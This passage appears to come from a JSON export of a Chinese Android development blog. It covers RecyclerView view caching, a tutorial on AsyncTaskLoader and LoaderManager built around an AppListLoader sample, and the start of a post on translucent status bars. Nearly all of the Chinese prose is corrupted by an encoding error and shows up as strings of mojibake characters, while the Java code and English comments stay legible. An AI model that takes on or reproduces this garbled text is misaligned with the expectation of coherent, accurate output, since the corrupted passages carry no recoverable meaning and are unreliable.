onLayoutChildrenç»§ç»­èµ°ï¼Œè°ƒç”¨åˆ°fill -&gt;layoutChunk -&gt; addView -&gt;addViewInt -&gt; unScrap -&gt; unScrapViewï¼ˆè¿™ä¸ªæ—¶å€™å°±ä»mAttachedScrapä¸­ç§»é™¤æ‰åˆšæ‰åŠ è¿›å»çš„viewHolderï¼‰åˆ°è¿™é‡ŒviewHolderçš„itemView.getParent = null(è€Œè§†è§‰ä¸Šè¿™ä¸ªViewæ˜¯æ˜æ˜å­˜åœ¨çš„) åœ¨unScrapViewä¹‹åï¼Œè°ƒç”¨ mChildHelper.attachViewToParent(child, index, child.getLayoutParams(), false) å°±æ˜¯é‡æ–°è°ƒç”¨recyclerView.attachViewToParent()æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªViewGroupçš„æ–¹æ³•ï¼Œè¿™é‡Œé¢è°ƒç”¨äº†addInArrayæ–¹æ³•ã€‚è€ŒattachViewToParentæ–¹æ³•ä¼šè§¦å‘requestLayoutï¼Œåœ¨RecyclerViewçš„requestLayoutæ–¹æ³•ä¸­ @Override public void requestLayout() { if (mEatRequestLayout == 0 &amp;&amp; !mLayoutFrozen) { super.requestLayout();//å¤šæ•°æƒ…å†µä¸‹ï¼ŒattachViewToParentä¸ä¼šè§¦å‘è¿™ä¸ªæ–¹æ³• } else { mLayoutRequestEaten = true; } } ä»å‘½åæ¥çœ‹ï¼Œè¿™é‡Œå­˜æ”¾çš„æ˜¯æ²¡æœ‰è¢«æ»‘å‡ºå±å¹•çš„View,ä¹Ÿå°±æ˜¯å½“å‰å±å¹•ä¸Šæ­£æ˜¾ç¤ºç€çš„Viewã€‚debugæ¥çœ‹ï¼Œä¹Ÿç¡®å®å¦‚æ­¤ã€‚ æ‰€ä»¥ç›´æ¥åœ¨tryGetViewHolderForPositionByDeadlineä¸­æ‰“æ–­ç‚¹ï¼Œå‘ç°ï¼š é¾Ÿé€Ÿæ‹–åŠ¨RecylerViewçš„æ—¶å€™ï¼ŒHolderæ˜¯åœ¨getScrapOrHiddenOrCachedHolderForPositionä¸­ä»mCachedViewsä¸­æ‰¾åˆ°çš„ å¤§æ¦‚ç‡æƒ…å†µä¸‹ï¼Œä»mCachedViewsä¸­è·å–åˆ°çš„viewHolderä¸ä¼šèµ°åˆ°ä¸Šé¢tryBindViewHolderByDeadlineé‡Œé¢ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨çš„é‚£ç§ã€‚è€Œä»viewPoolä¸­å›æ”¶å¾—åˆ°çš„viewHolderéƒ½ä¼šèµ°onBindViewHolderæ–¹æ³•ã€‚ï¼ˆä¸æ˜¯å¾ˆç¡®å®šï¼Œæ‰“æ–­ç‚¹å‡ ä¹éƒ½æ˜¯è¿™ç§æƒ…å†µï¼‰.è¿™ä¹ˆè¯´å§ï¼ŒmCacheViewsä¸­æ‹¿å‡ºæ¥çš„viewHolderæ˜¯ä¸éœ€è¦bindçš„,recyclerPoolé‡Œé¢æ‹¿å‡ºæ¥çš„viewHolderæ˜¯éœ€è¦é‡æ–°bindçš„ã€‚ å¦‚æœæƒ³è¦å‡å°‘onBindViewHolderçš„æ¬¡æ•°çš„è¯ï¼Œå¯ä»¥æŠŠmCachedViewsçš„å¤§å°è®¾ç½®å¤§ä¸€ç‚¹ã€‚è¿™ä¸ªapiåº”è¯¥å«åšRecycler.setViewCacheSize()ã€‚é»˜è®¤ä¼ è¿›å»çš„æ˜¯2.ä¹Ÿå°±æ˜¯è¯´RecyclerViewé¡¶éƒ¨å’Œåº•éƒ¨é»˜è®¤è¿˜è—ç€ä¸€ä¸ªéšæ—¶å‡†å¤‡è¢«æ»‘åŠ¨å‡ºæ¥çš„View.æ¯æ¬¡layoutManagerå°è¯•å»è·å–ä¸€ä¸ªViewçš„æ—¶å€™ï¼Œä¼šæ›´åŠ å®¹æ˜“ä»mCachedViewsä¸­è·å¾—viewHolderã€‚ mCachedViewså’ŒrecyclerPoolä¸­çš„view.getParentéƒ½ä¸ºNullã€‚ onViewDetachedFromWindowæ—¶åªä¸è¿‡æ‰åˆšåˆšåŠ å…¥mCachedViewsï¼ŒonViewRecycledæ‰æ˜¯viewè¢«ç§»åŠ¨åˆ°poolä¸­äº†(è¿™ä¸ªæ—¶å€™å‰”é™¤viewçš„ä¸€äº›èµ„æºæ˜¯å®Œå…¨OKï¼ˆæ¯”å¦‚setImageDrawable(null)ï¼Œæ¯”å¦‚videoPlayer stopï¼‰çš„ï¼Œå› ä¸ºä¸‹æ¬¡é‡æ–°å–å‡ºæ¥çš„æ—¶å€™åæ­£åˆè¦é‡æ–°bindä¸€é). RecylerViewçš„ç¼“å­˜æä¾›äº†viewCacheExtensionè¿™ä¸ªæ¥å£ï¼Œå¼€å‘è€…å¯ä»¥è‡ªå®šä¹‰ä¸€å±‚Viewçš„ç¼“å­˜ å‡†ç¡®æ¥è®²ï¼Œç¼“å­˜ä¸€å…±æœ‰å››å±‚ï¼ŒmAttachedScrap,mCachedViews,viewCacheExtensionè¿˜æœ‰recyclerPool package privateçš„å˜é‡æ˜¯å¦å°±ä¸èƒ½è®¿é—®åˆ°ï¼Ÿæ¯”å¦‚V7åŒ…é‡Œçš„RecyclerViewï¼Œé‡Œé¢çš„Recycleræ˜¯package-privateæƒé™ã€‚äºæ˜¯æ–°å»ºä¸€ä¸ªpackage android.support.v7.widgetè¿™æ ·çš„åŒ…ã€‚æ¥ä¸‹æ¥åœ¨è¿™ä¸ªåŒ…é‡Œé¢çš„classå°±èƒ½ç›´æ¥è®¿é—®RecyclerViewä¸­çš„package-privateæƒé™çš„æˆå‘˜å˜é‡äº†ã€‚äº²æµ‹å¯è¡Œã€‚ ä¸€ä¸ªå°é—®é¢˜ï¼šitemDecorationåœ¨notifyItemRemoved(onDrawOver)çš„æ—¶å€™ï¼Œé‚£ä¸ªdecorationå¥½åƒä¸åœ¨åŠ¨ 4 . ä¸€äº›å‚è€ƒèµ„æ–™ RecyclerView Animations and Behind the Scenes (Android Dev Summit 2015) ItemAnimatoræ¨¡æ¿ UI ToolKit Demo Yigit Boyar: Pro RecyclerView RecyclerViewçš„æºç è§£æ è¯´çš„æ¯”è¾ƒæ¸…æ¥š","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"RecyclerView","slug":"RecyclerView","permalink":"https://haldir65.github.io/tags/RecyclerView/"}]},{"title":"ä½¿ç”¨Loaderè¿›è¡Œå¼‚æ­¥æ•°æ®æ“ä½œ","date":"2016-10-15T19:12:22.000Z","path":"2016/10/15/2016-10-15-using-loader-in-android-app/","text":"Appä¸­ç»å¸¸æœ‰è¿™æ ·çš„éœ€æ±‚:è¿›å…¥ä¸€ä¸ªé¡µé¢ï¼Œé¦–å…ˆæŸ¥è¯¢æ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“æ•°æ®æœ‰æ•ˆï¼Œç›´æ¥ä½¿ç”¨æ•°æ®åº“æ•°æ®ã€‚å¦åˆ™å»ç½‘ç»œæŸ¥è¯¢æ•°æ®ï¼Œç½‘ç»œæ•°æ®è¿”å›åé‡æ–°åŠ è½½æ•°æ®ã€‚å¾ˆæ˜¾ç„¶ï¼Œè¿™é‡Œçš„æŸ¥è¯¢æ•°æ®åº“å’Œç½‘ç»œè¯·æ±‚éƒ½éœ€è¦æ”¾åˆ°å­çº¿ç¨‹å»æ“ä½œï¼Œå¼‚æ­¥äº†ã€‚androidæ¨èä½¿ç”¨Loaderè¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œæœ€å¤§çš„å¥½å¤„å°±æ˜¯Laoderä¼šå¤„ç†å¥½ä¸ç”Ÿå‘½å‘¨æœŸç›¸å…³çš„äº‹æƒ…ï¼ŒAndroid Developersæ¨å‡ºè¿‡å…³äºLoadersçš„ä»‹ç»è§†é¢‘ï¼ŒLoaderå°±æ˜¯ä¸ºäº†è§£å†³è¿™ç§é—®é¢˜è€Œæ¨å‡ºçš„ï¼ŒLoaderå…·æœ‰å‡ ç‚¹å¥½å¤„ å¦‚æœActivityæŒ‚æ‰äº†ï¼ŒActivityä¸­å¯åŠ¨äº†çš„çº¿ç¨‹æ€ä¹ˆåŠï¼Œå¦‚æœä¸å¤„ç†å¥½æœ‰å¯èƒ½å¯¼è‡´leakã€‚ activityæŒ‚äº†ï¼Œè€Œå­çº¿ç¨‹ä¸­æŒæœ‰Viewçš„å¼ºå¼•ç”¨ï¼Œæ­¤æ—¶å†å»æ›´æ–°Viewå·²ç»æ²¡æœ‰æ„ä¹‰ï¼ŒViewå·²ç»ä¸å¯è§äº† è¿™æ¡çº¿ç¨‹æ‰€åšçš„å·¥ä½œï¼ŒåŠ è½½çš„èµ„æºéƒ½ç™½ç™½æµªè´¹äº†ï¼Œä¸‹æ¬¡è¿˜éœ€è¦é‡æ–°åŠ è½½ä¸€éã€‚ 1. è‡ªå®šä¹‰ä¸€ä¸ªLoader(åŠ è½½æ•°æ®ç±»å‹ï¼ŒCacheå¤„ç†ç­‰)Loaderçš„ä½¿ç”¨å°±åƒä¸€ä¸ªAsyncTaskä¸€æ ·ï¼Œå¯ä»¥æå‰æŒ‡å®šéœ€è¦åœ¨å¼‚æ­¥çº¿ç¨‹ä¸­åšçš„äº‹æƒ…ã€æ•°æ®ç±»å‹ä»¥åŠå®ŒæˆåŠ è½½åå°†æ•°æ®æ¨é€åˆ°ä¸»çº¿ç¨‹ã€‚è°·æ­Œç»™å‡ºäº†ä¸€ä¸ªä½¿ç”¨Loaderæ¥æŸ¥è¯¢æ‰‹æœºä¸Šå®‰è£…çš„Appå¹¶æ˜¾ç¤ºåœ¨ä¸€ä¸ªListViewä¸­çš„DemoAppï¼Œè™½ç„¶æ˜¯å¥½å‡ å¹´å‰çš„ä¸œè¥¿äº†ï¼Œå¹¶ä¸”ä½¿ç”¨çš„æ˜¯V4åŒ…é‡Œçš„Loader,ä½†è¿˜æ˜¯å€¼å¾—å­¦ä¹ ã€‚é¦–å…ˆæ¥çœ‹è‡ªå®šä¹‰çš„AppListLoader public class AppListLoader extends AsyncTaskLoader&lt;List&lt;AppEntry&gt;&gt; { //AsynTaskLoaderæ”¯æŒæ³›å‹ï¼ŒAppEntryæ˜¯å·²å®‰è£…Appä¿¡æ¯çš„åŒ…è£…ç±»ã€‚ private List&lt;AppEntry&gt; mApps; //æŸ¥è¯¢çš„Appåˆ—è¡¨ä¿å­˜ä¸ºæˆå‘˜å˜é‡ final PackageManager mPm; private boolean DEBUG = true; public static final String TAG = AppListLoader.class.getSimpleName(); //æ„é€ å‡½æ•° public AppListLoader(Context ctx) { // Loaders may be used across multiple Activitys (assuming they aren&#39;t // bound to the LoaderManager), so NEVER hold a reference to the context // directly. Doing so will cause you to leak an entire Activity&#39;s context. // The superclass constructor will store a reference to the Application // Context instead, and can be retrieved with a call to getContext(). super(ctx); //ç¬¬ä¸€ï¼Œè¿™é‡Œè¿è¡Œåœ¨ä¸»çº¿ç¨‹ä¸Šï¼› //ç¬¬äºŒï¼Œä¼ è¿›æ¥çš„context(ä¸€èˆ¬æ˜¯Activityåªæ˜¯ä¸ºäº†è·å–ApplicationContext) mPm = getContext().getPackageManager();//getContext()è¿”å›çš„æ˜¯Applicationçš„Contextã€‚ } @Override public List&lt;AppEntry&gt; loadInBackground() { if (DEBUG) Log.i(TAG, &quot;+++ loadInBackground() called! +++&quot;); LogUtil.p(&quot;&quot;);// å­çº¿ç¨‹,è€—æ—¶çš„å·¥ä½œæ”¾åˆ°è¿™é‡Œ // Retrieve all installed applications. List&lt;ApplicationInfo&gt; apps = mPm.getInstalledApplications(0);//PackageManagerçš„æ–¹æ³• if (apps == null) { apps = new ArrayList&lt;ApplicationInfo&gt;(); } // Create corresponding array of entries and load their labels. List&lt;AppEntry&gt; entries = new ArrayList&lt;AppEntry&gt;(apps.size()); for (int i = 0; i &lt; apps.size(); i++) { AppEntry entry = new AppEntry(this, apps.get(i)); entry.loadLabel(getContext()); entries.add(entry); } // Sort the list. Collections.sort(entries, ALPHA_COMPARATOR); return entries; } @Override public void deliverResult(List&lt;AppEntry&gt; apps) { //è¿è¡Œåœ¨ä¸»çº¿ç¨‹ä¸Š if (isReset()) {//è¿™é‡Œå°±ç±»ä¼¼äºAsyncTaskçš„onPostExecuteäº†ï¼ŒæŠŠå­çº¿ç¨‹å¤„ç†å¥½çš„æ•°æ®æ¨é€åˆ°ä¸»çº¿ç¨‹ if (DEBUG) Log.w(TAG, &quot;+++ Warning! An async query came in while the Loader was reset! +++&quot;); // The Loader has been reset; ignore the result and invalidate the data. // This can happen when the Loader is reset while an asynchronous query // is working in the background. That is, when the background thread // finishes its work and attempts to deliver the results to the client, // it will see here that the Loader has been reset and discard any // resources associated with the new data as necessary. if (apps != null) { releaseResources(apps); return; } }//å¦‚æœè°ƒç”¨äº†reset()æ–¹æ³•ï¼Œè¯´æ˜å­çº¿ç¨‹åŠ è½½çš„æ•°æ®æ˜¯æ— æ•ˆçš„ï¼Œé‡Šæ”¾èµ„æºï¼Œå¤„ç†æ— æ•ˆæ•°æ® // Hold a reference to the old data so it doesn&#39;t get garbage collected. // We must protect it until the new data has been delivered. List&lt;AppEntry&gt; oldApps = mApps; mApps = apps; if (isStarted()) {// å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œå³è°ƒç”¨äº†startLoadingä¸”stopLoadingå’Œresetå‡ä¸ºè¢«è°ƒç”¨ if (DEBUG) Log.i(TAG, &quot;+++ Delivering results to the LoaderManager for&quot; + &quot; the ListFragment to display! +++&quot;); // If the Loader is in a started state, have the superclass deliver the // results to the client. super.deliverResult(apps); } // Invalidate the old data as we don&#39;t need it any more. if (oldApps != null &amp;&amp; oldApps != apps) { if (DEBUG) Log.i(TAG, &quot;+++ Releasing any old data associated with this Loader. +++&quot;); releaseResources(oldApps); } } } åˆ°æ­¤ï¼Œæ•°æ®åŠ è½½çš„Serverç«¯ç®—æ˜¯å®Œæˆï¼Œè¿™é‡Œæ³¨æ„è°ƒç”¨åˆ°äº†isReset()ã€isStarted()ç­‰æ–¹æ³•ï¼Œè¿™äº›å°±æ˜¯Serverç«¯åœ¨åœ¨å¤„ç†Clientç«¯ç”Ÿå‘½å‘¨æœŸæ˜¯éœ€è¦æ³¨æ„çš„ï¼Œè¿™ä¸ªåé¢å†è¯´ã€‚ 2. ä½¿ç”¨LoaderManagerç®¡ç†Loaderæˆ‘ä»¬ä½¿ç”¨LoaderManageråœ¨Activityæˆ–Fragmentä¸­ä¸Loaderäº¤äº’ã€‚é€šå¸¸åœ¨onCreateæˆ–è€…onActivityCreatedä¸­: getSupportedLoaderManager.initLoader()//Activityä¸­getLoaderManager() //Fragmentä¸­ è¿™é‡Œä»‹ç»åœ¨Fragmentä¸­çš„ä½¿ç”¨ï¼Œå› ä¸ºLoaderå¤„ç†å¥½äº†ä¸Activity,Fragmentç”šè‡³Child Fragmentçš„ç”Ÿå‘½å‘¨æœŸã€‚æ¨èä½¿ç”¨v4åŒ…é‡Œçš„Loaderï¼ŒLoaderæ˜¯åœ¨Android3.0å¼•å…¥FrameWorkä¸­çš„ï¼Œä½†v4åŒ…è®©Loadderåœ¨æ›´æ—©çš„ç‰ˆæœ¬ä¸Šä¹Ÿæœ‰ç›¸åº”çš„APIã€‚æ›´é‡è¦çš„æ˜¯ï¼Œv4 åŒ…ä¸­çš„Loaderæ˜¯ä¼´éšç€v4åŒ…æ–°çš„release stepï¼Œä¹Ÿå°±æ˜¯è¯´v4åŒ…ä¼šä¸æ—¶ä¿±è¿›ä¿®å¤å…¶ä¸­çš„bugã€‚è¿™ä¸€ç‚¹åœ¨mediumä¸Šæœ‰ä»‹ç» ã€‚å†çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³• public abstract Loader initLoader(int id, Bundle args, LoaderManager.LoaderCallbacks callback); Demoä¸­ä½¿ç”¨çš„æ˜¯Fragmentï¼š // Initialize a Loader with id â€˜1â€™. If the Loader with this id already // exists, then the LoaderManager will reuse the existing Loader. getLoaderManager().initLoader(LOADER_ID, null, this); ç›¸å¯¹åº”çš„Fragmentéœ€è¦implements LoaderManager.LoaderCallbacks&lt;List&gt; //æ³¨æ„æ³›å‹è¿™ä¸ªæ¥å£æœ‰ä¸‰ä¸ªæ–¹æ³• public interface LoaderCallbacks&lt;D&gt; { public Loader&lt;D&gt; onCreateLoader(int id, Bundle args); public void onLoadFinished(Loader&lt;D&gt; loader, D data); public void onLoaderReset(Loader&lt;D&gt; loader); } çœ‹ä¸€ä¸‹Demoä¸­æ˜¯å¦‚ä½•å®ç°çš„ @Override public android.support.v4.content.Loader&lt;List&lt;AppEntry&gt;&gt; onCreateLoader(int id, Bundle args) { if (DEBUG) Log.i(TAG, &quot;+++ onCreateLoader() called! +++&quot;); return new AppListLoader(getActivity()); } @Override public void onLoadFinished(android.support.v4.content.Loader&lt;List&lt;AppEntry&gt;&gt; loader, List&lt;AppEntry&gt; data) { if (DEBUG) Log.i(TAG, &quot;+++ onLoadFinished() called! +++&quot;); mAdapter.setData(data);//åŠ è½½æ•°æ®åˆ°UI if (isResumed()) { setListShown(true); } else { setListShownNoAnimation(true); } } @Override public void onLoaderReset(android.support.v4.content.Loader&lt;List&lt;AppEntry&gt;&gt; loader) { if (DEBUG) Log.i(TAG, &quot;+++ onLoadReset() called! +++&quot;); mAdapter.setData(null);//loaderè¢«resetï¼ŒUIè¿™è¾¹éœ€è¦æ¸…é™¤æ‰€æœ‰ä¸Loaderæ•°æ®ç›¸å…³çš„å¼•ç”¨ï¼Œä½†æ¸…é™¤æ•°æ®çš„ä»»åŠ¡ä¼šç”±Loaderå¤„ç†å¥½ } åœ¨ä¸‰ä¸ªæ˜æ˜¾çš„å›è°ƒä¸­å¤„ç†å¥½æ•°æ®ç»‘å®šåˆ°UIåŠè¿‡æœŸæ•°æ®çš„æ¸…ç†å³å¯ã€‚ 3. å¤„ç†Activityç”Ÿå‘½å‘¨æœŸçš„é—®é¢˜å›åˆ°serverç«¯(Loader),AsyncTaskLoaderæ˜¯ä¸€ä¸ªabstract classï¼ŒloadInBackgroundæ–¹æ³•å·²ç»å®ç°äº†ï¼Œä½†è¿˜æœ‰å‡ ä¸ªæ–¹æ³•å¼ºè°ƒå¿…é¡»è¦å¤å†™æˆ–è€…ä¸ç”Ÿå‘½å‘¨æœŸç›¸å…³ @Override protected void onStartLoading() { /* Subclasses must implement this to take care of loading their data, as per {@link #startLoading()}. This is not called by clients directly, but as a result of a call to {@link #startLoading()}.*/ //åœ¨è¿™é‡Œæ£€æŸ¥ä¸€ä¸‹æˆå‘˜å˜é‡ä¸­çš„æ•°æ®æ˜¯å¦ä¸ä¸ºç©ºï¼Œæœ‰æ•°æ®çš„è¯ï¼ŒdeliverResults } @Override protected void onStopLoading() { /*Subclasses must implement this to take care of stopping their loader, as per {@link #stopLoading()}. This is not called by clients directly, but as a result of a call to {@link #stopLoading()}. This will always be called from the process&#39;s main thread.*/ } @Override protected void onReset() { /* Subclasses must implement this to take care of resetting their loader, as per {@link #reset()}. This is not called by clients directly, but as a result of a call to {@link #reset()}. This will always be called from the process&#39;s main thread. å¦‚æœè°ƒç”¨äº†destoryLoaderæˆ–è€…Loaderç›¸å…³è”çš„Activity/Fragmentè¢«destoryäº† æ‰€ä»¥åœ¨Demoä¸­å¯ä»¥çœ‹åˆ°onReseté‡Œé¢è°ƒç”¨äº†onStopLoadingå»å–æ¶ˆå½“å‰ä»»åŠ¡ï¼ŒåŒæ—¶é‡Šæ”¾èµ„æºï¼Œå–æ¶ˆå¹¿æ’­æ³¨å†Œ*/ } @Override public void onCanceled(List&lt;AppEntry&gt; apps) { /* Called if the task was canceled before it was completed. Gives the class a chance to clean up post-cancellation and to properly dispose of the result. @param data The value that was returned by {@link #loadInBackground}, or null if the task threw {@link OperationCanceledException}.*/ //åœ¨è¿™é‡Œé‡Šæ”¾èµ„æº } @Override public void forceLoad() { /*Force an asynchronous load. Unlike {@link #startLoading()} this will ignore a previously loaded data set and load a new one. This simply calls through to the implementation&#39;s {@link #onForceLoad()}. You generally should only call this when the loader is started -- that is, {@link #isStarted()} returns true. Must be called from the process&#39;s main thread.*/ //startLoadingä¼šç›´æ¥ä½¿ç”¨onConfigurationchangeä¹‹å‰çš„Activityä¸­LoaderåŠ è½½çš„æ•°æ®ï¼Œä½†è¿™é‡Œåˆ™æ”¾å¼ƒæ—§çš„æ•°æ®ï¼Œé‡æ–°åŠ è½½ï¼Œæ‰€ä»¥isStartedä¼šåœ¨è¿™æ—¶è¿”å›true } è€ƒè™‘ä¸€ä¸‹ï¼Œå¦‚æœåœ¨åŠ è½½æ•°æ®è¿‡ç¨‹ä¸­æ•°æ®æºå‘ç”Ÿäº†å˜åŒ–ï¼Œæ¯”å¦‚åœ¨æ‰«æå·²å®‰è£…Appè¿‡ç¨‹ä¸­åˆå®‰è£…äº†æ–°çš„Appæ€ä¹ˆåŠï¼Ÿæ‰€ä»¥è¿™é‡Œåˆæ³¨å†Œäº†ä¸¤ä¸ªå¹¿æ’­ï¼Œåœ¨onReceiveçš„æ—¶å€™è°ƒç”¨ mLoader.onContentChanged(); //è¿™ä¼šç›´æ¥è°ƒç”¨forceLoadï¼ˆLoaderå·²ç»startedï¼‰æˆ–è€…è®¾ç½®ä¸€ä¸ªæ ‡å¿—ä½ï¼Œè®©takeContentChangedï¼ˆï¼‰è¿”å›trueåœ¨onStartLoadingä¸­å‘ç°è¿™ä¸ªä¸ºtrueï¼Œç›´æ¥forceLoad//æ¥ä¸‹æ¥è¿›å…¥loadInBackground,å®Œæˆåè¿›å…¥deliverResultdeliverResulté¦–å…ˆæ£€æŸ¥Activityæ˜¯å¦destoryed(æŒ‚äº†ç›´æ¥é‡Šæ”¾èµ„æº),æ²¡æŒ‚çš„è¯åˆ¤æ–­ä¸‹isStarted(æ˜¯å¦ä¸€åˆ‡æ­£å¸¸ï¼Œæœªè°ƒç”¨è¿‡stopLoadingæˆ–reset)ï¼Œç¬¦åˆæ¡ä»¶çš„è¯é€šè¿‡super.deliverResultæŠŠæ•°æ®ä¼ é€’å‡ºå»ã€‚æ¥ä¸‹æ¥åˆ¤æ–­ä¸‹ä¹‹å‰çš„æ—§æ•°æ®å’Œæ–°æ•°æ®æ˜¯å¦ä¸€è‡´ï¼Œå¦åˆ™é‡Šæ”¾æ‰æ—§æ•°æ® æ•´ä¸ªè¿‡ç¨‹è€ƒè™‘åˆ°äº†æ•°æ®çš„æœ‰æ•ˆæ€§ï¼Œèµ„æºçš„é‡Šæ”¾ï¼Œåœ¨Loaderè¿™ä¸€ç«¯ï¼Œé€šè¿‡isReset,isStartedç­‰æ–¹æ³•ç¡®ä¿äº†ä¸ç¡®å®šçš„æ•°æ®åŠ è½½è¿‡ç¨‹èƒ½å¤Ÿå’Œä¸ç¡®å®šçš„ç”Ÿå‘½å‘¨æœŸå’Œè°å…±å¤„ã€‚ç½‘ä¸Šçœ‹åˆ°çš„å…³äºLoaderçš„æ–‡ç« å¤§éƒ¨åˆ†æ˜¯å…³äºCursorLoaderçš„ï¼Œä¹Ÿå°±æ˜¯å’Œæ•°æ®åº“æ‰“äº¤é“çš„é‚£ä¸€å—ï¼Œè¿™é‡Œä¸ç»†è¯´ã€‚ä¸»è¦æ˜¯ç›®å‰æ²¡æœ‰çœ‹åˆ°å¤ªå¤šAppä¸­ä½¿ç”¨è¿™ç§åŠ è½½æ¨¡å¼ï¼Œå¯èƒ½ç¡®å®æœ‰ç‚¹éº»çƒ¦ã€‚åœ¨Mediumä¸Šçœ‹åˆ°è¿™ç¯‡æ–‡ç« ï¼Œè§‰å¾—è¿˜æ˜¯æœ‰å¿…è¦åšä¸€äº›è®°å½•çš„ã€‚ 4. å…³äºæ€§èƒ½æœ€åæˆ‘æƒ³è¯´çš„æ˜¯ï¼ŒAsyncTaskLoaderå†…éƒ¨ä½¿ç”¨çš„è¿˜æ˜¯AsyncTaské‚£ä¸€å¥—ï¼Œå…³äºAsyncTaskçš„ä¸²è¡Œå’Œå¹¶è¡Œçš„è®¨è®ºç½‘ä¸Šæœ‰å¾ˆå¤šã€‚äºæ˜¯æˆ‘çœ‹äº†ä¸‹AsyncTaskLoaderä¸­æœ€ç»ˆè°ƒç”¨AsyncTaskçš„executeæ–¹æ³•: mTask.executeOnExecutor(mExecutor, (Void[]) null); è‡³äºè¿™ä¸ªmExecutorçš„æœ¬è´¨: public static final Executor THREAD_POOL_EXECUTOR = new ThreadPoolExecutor(CORE_POOL_SIZE, MAXIMUM_POOL_SIZE, KEEP_ALIVE, TimeUnit.SECONDS, sPoolWorkQueue, sThreadFactory);CORE_POOL_SIZE = 5å—¯ï¼Œå¹¶è¡Œçš„çº¿ç¨‹æ± ï¼Œæ€§èƒ½åº”è¯¥è¿˜ä¸é”™ã€‚å­¦è¿‡rxjavaï¼Œæ˜¯å¦rxjavaä¼šæ˜¯ä¸€ç§æ¯”loaderæ›´å¥½çš„åŠ è½½æ•°æ®çš„æ–¹å¼å‘¢ Reference rxLoader making loading data on android lifecycle aware AppListLoader","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"fitSystemWindowå’Œæ²‰æµ¸å¼çŠ¶æ€æ çš„ä¸€äº›æ€»ç»“","date":"2016-10-14T17:15:47.000Z","path":"2016/10/14/2016-10-14-Android-translucent-status-bar/","text":"æ²‰æµ¸å¼çŠ¶æ€æ æ˜¯api 19ä¹‹åå¼•å…¥çš„ï¼ŒKitKatåº”è¯¥ç®—æ˜¯ä¸€æ¬¡æ¯”è¾ƒå¤§çš„æ›´æ–°äº†ï¼Œåƒæ˜¯Transitionï¼Œart runtime,storage access FrameWork(è¿™ä¸ªæœ‰ç©ºç ”ç©¶ä¸‹)ï¼Œå¦å¤–å°±æ˜¯è¿™ä¸ªè¢«å®˜æ–¹ç§°ä¸ºFull-screen immersive modeçš„ç‰¹æ€§äº†ã€‚å…·ä½“æ¥è¯´ï¼ŒAppå¯ä»¥å°†å±•ç¤ºçš„åŒºåŸŸæ‹“å±•åˆ°statusBarçš„ä½ç½®äº†ã€‚æˆ‘è§‰å¾—ç›´æ¥å«statusBarå°±å¥½äº†ï¼Œå¤§éƒ¨åˆ†äººåº”è¯¥ä¹Ÿèƒ½ç†è§£è¿™å°±æ˜¯æ‰‹æœºä¸Šæ˜¾ç¤ºâ€ä¸­å›½ç§»åŠ¨â€è¿˜æœ‰æ˜¾ç¤ºæ‰‹æœºç”µé‡é‚£ä¸€å—çš„é•¿æ¡ï¼Œå®½åº¦æ˜¯match_parentã€‚é«˜åº¦çš„è¯ï¼Œæ®è¯´æ˜¯25dpï¼Œç„¶å6.0ä¸Šç»™æ”¹æˆäº†24dpã€‚ä¸è¿‡è¿™ä¸æ˜¯é‡ç‚¹ 1.æœ€åˆçš„åšæ³•çœ‹åˆ°æœ‰äººæ¨èä½¿ç”¨SystemBarTintè¿™ä¸ªclass,åˆšä¸Šæ¥è§‰å¾—ä¹ŸæŒºå¥½ç”¨çš„ï¼Œå°±æ˜¯ä¸€ä¸ªjava classï¼Œç›´æ¥å¤åˆ¶ç²˜è´´åˆ°é¡¹ç›®é‡Œï¼Œæ”¹ä¸€ä¸‹package nameï¼Œæ— è„‘ä½¿ç”¨å³å¯ã€‚åŸç†çš„è¯ï¼Œçœ‹è¿‡æºç åï¼Œå¤§è‡´æ˜ç™½æ˜¯åœ¨statusBarçš„ä½ç½®æ·»åŠ ä¸€ä¸ªnew Viewï¼Œç„¶åæŒæœ‰è¿™ä¸ªviewçš„å¼•ç”¨ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥åšå¸¸è§„çš„setBackgroundæˆ–è€…setBackgroundColoräº†ã€‚åˆå§‹åŒ–æ—¶çš„å…³é”®ä»£ç å¦‚ä¸‹ private void setupStatusBarView(Context context, ViewGroup decorViewGroup) {//è¿™ä¸ªdecorViewGroupæŒ‡çš„æ˜¯activity.getWindow() mStatusBarTintView = new View(context); LayoutParams params = new LayoutParams(LayoutParams.MATCH_PARENT, mConfig.getStatusBarHeight()); params.gravity = Gravity.TOP; if (mNavBarAvailable &amp;&amp; !mConfig.isNavigationAtBottom()) { params.rightMargin = mConfig.getNavigationBarWidth(); } mStatusBarTintView.setLayoutParams(params); mStatusBarTintView.setBackgroundColor(DEFAULT_TINT_COLOR); mStatusBarTintView.setVisibility(View.GONE); decorViewGroup.addView(mStatusBarTintView); } ä¸€åˆ‡çœ‹èµ·æ¥éƒ½å¾ˆç¾å¥½ 2. ç›´åˆ°ç¢°åˆ°äº†fitSystemWindow = tureå‡ ä¸ªæœˆå‰æ›¾ç»åœ¨é¡¹ç›®é‡Œå†™è¿‡ä¸€ä¸ªæ™®é€šçš„Coordinatelayoutå†…éƒ¨CollapingToolbarLayoutçš„æ²‰æµ¸å¼çŠ¶æ€æ å®ç°ï¼Œå½“æ—¶ä¸ºäº†èµ¶è¿›åº¦ä¸€ç›´è¯•åˆ°å¤œé‡Œ2ç‚¹æ‰å°è¯•å‡ºåœ¨4.4å’Œ5.0ä»¥ä¸Šæ‰‹æœºéƒ½èƒ½æ»¡æ„çš„æ•ˆæœã€‚ç°åœ¨æƒ³æƒ³æœ‰äº›äº‹è¿˜æ˜¯èƒ½å¤Ÿäº‹å…ˆææ¸…æ¥šçš„å¥½ï¼Œè¢«åŠ¨å­¦ä¹ çš„ä»£ä»·å®åœ¨å¤ªå¤§ã€‚å½“æ—¶çš„æ–¹æ³•æ˜¯ç»™Toolbaræ·»åŠ 